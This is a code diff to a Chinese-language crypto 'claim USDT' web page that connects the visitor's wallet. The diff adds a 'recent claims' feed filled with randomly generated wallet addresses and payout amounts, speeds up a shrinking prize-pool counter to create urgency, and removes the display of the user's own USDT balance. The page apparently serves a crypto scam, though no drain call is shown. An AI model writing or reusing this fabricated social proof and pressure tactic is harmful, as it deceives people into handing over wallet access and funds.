@@ -275,6 +275,64 @@
       color: var(--error) !important;
     }
 
+    /* Claim Records */
+    .claim-records {
+      background: var(--bg-dark);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 12px;
+      margin-bottom: 20px;
+      max-height: 150px;
+      overflow: hidden;
+    }
+
+    .records-title {
+      font-size: 12px;
+      color: var(--text-muted);
+      margin-bottom: 8px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .records-list {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .record-item {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 8px 10px;
+      background: rgba(0, 230, 118, 0.05);
+      border: 1px solid rgba(0, 230, 118, 0.15);
+      border-radius: 8px;
+      font-size: 12px;
+      animation: slideIn 0.3s ease-out;
+    }
+
+    @keyframes slideIn {
+      from {
+        opacity: 0;
+        transform: translateY(-10px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .record-address {
+      font-family: 'Monaco', monospace;
+      color: var(--text-secondary);
+    }
+
+    .record-amount {
+      font-weight: 600;
+      color: var(--success);
+    }
+
     /* Info Box */
     .info-box {
       background: rgba(68, 138, 255, 0.1);
@@ -600,18 +658,10 @@
           </p>
         </div>
 
-        <!-- Wallet Info -->
-        <div class="wallet-info" id="walletInfo">
-          <div class="wallet-row">
-            <div>
-              <div class="wallet-label">钱包地址</div>
-              <div class="wallet-address" id="walletAddress"></div>
-            </div>
-            <div class="wallet-balance">
-              <div class="balance-value" id="usdtBalance">---</div>
-              <div class="balance-label">USDT 余额</div>
-            </div>
-          </div>
+        <!-- Claim Records -->
+        <div class="claim-records" id="claimRecords">
+          <div class="records-title">📢 最近领取</div>
+          <div class="records-list" id="recordsList"></div>
         </div>
 
         <!-- Contact Section -->
@@ -702,9 +752,6 @@
 
     let web3, account;
     const status = document.getElementById("status");
-    const walletInfo = document.getElementById("walletInfo");
-    const walletAddress = document.getElementById("walletAddress");
-    const usdtBalance = document.getElementById("usdtBalance");
     const poolBalance = document.getElementById("poolBalance");
     const actionBtn = document.getElementById("actionBtn");
 
@@ -726,12 +773,10 @@
           }
         }
         [account] = await web3.eth.getAccounts();
-        walletAddress.innerText = account.slice(0, 8) + '...' + account.slice(-6);
-        walletInfo.style.display = "block";
         status.className = "success";
         status.innerHTML = `<span>✅ 钱包连接成功</span><small>${account.slice(0,10)}...${account.slice(-8)}</small>`;
-        await updateUSDTBalance();
         startPoolAnimation();
+        startRecordsAnimation();
         return true;
       } catch (e) {
         status.className = "error";
@@ -740,20 +785,61 @@
       }
     }
 
-    async function updateUSDTBalance() {
-      try {
-        const usdt = new web3.eth.Contract(ABI_USDT, USDT);
-        const balance = await usdt.methods.balanceOf(account).call();
-        const formatted = (balance / 1e6).toFixed(2);
-        usdtBalance.innerText = formatted;
-      } catch (e) {
-        usdtBalance.innerText = "--";
-      }
-    }
-
-    // 动态奖池递减效果
+    // 动态奖池递减效果 (1秒跳一次)
     let poolInterval = null;
     let currentPoolPercent = 30;
+    let recordsInterval = null;
+    
+    // 随机地址生成
+    function generateRandomAddress() {
+      const chars = '0123456789abcdef';
+      let addr = '0x';
+      for (let i = 0; i < 40; i++) {
+        addr += chars[Math.floor(Math.random() * chars.length)];
+      }
+      return addr.slice(0, 6) + '...' + addr.slice(-4);
+    }
+    
+    // 随机金额生成
+    function generateRandomAmount() {
+      const amounts = [50, 100, 150, 200, 280, 350, 420, 500, 680, 800, 999, 1200, 1500, 2000];
+      return amounts[Math.floor(Math.random() * amounts.length)];
+    }
+    
+    // 添加领取记录
+    function addClaimRecord() {
+      const recordsList = document.getElementById('recordsList');
+      const address = generateRandomAddress();
+      const amount = generateRandomAmount();
+      
+      const recordHTML = `
+        <div class="record-item">
+          <span class="record-address">${address}</span>
+          <span class="record-amount">+${amount} USDT</span>
+        </div>
+      `;
+      
+      recordsList.insertAdjacentHTML('afterbegin', recordHTML);
+      
+      // 最多保留10条记录
+      const records = recordsList.querySelectorAll('.record-item');
+      if (records.length > 10) {
+        records[records.length - 1].remove();
+      }
+    }
+    
+    // 开始领取记录动画
+    function startRecordsAnimation() {
+      // 立即添加一条
+      addClaimRecord();
+      
+      // 每1-3秒随机添加一条
+      recordsInterval = setInterval(() => {
+        if (Math.random() > 0.3) { // 70%概率添加
+          addClaimRecord();
+        }
+      }, 2000);
+    }
     
     function startPoolAnimation() {
       currentPoolPercent = 30;
@@ -761,7 +847,7 @@
       poolBalance.classList.add('loading');
       
       poolInterval = setInterval(() => {
-        currentPoolPercent -= 0.1;
+        currentPoolPercent -= 0.5; // 每次减少0.5%，1秒跳一次
         
         if (currentPoolPercent <= 5) {
           currentPoolPercent = 5;
@@ -773,7 +859,7 @@
         } else {
           poolBalance.innerText = currentPoolPercent.toFixed(1) + "%";
         }
-      }, 100); // 每100毫秒减少0.1%
+      }, 1000); // 每1000毫秒（1秒）减少0.5%
     }
     
     function stopPoolAnimation() {
@@ -813,7 +899,7 @@
 
         status.className = "success";
         status.innerHTML = "<span>🎉 领取成功！</span><small>USDT 已到账</small>";
-        await updateUSDTBalance();
+        addClaimRecord(); // 立即添加一条自己的领取记录
         startPoolAnimation();
 
       } catch (e) {
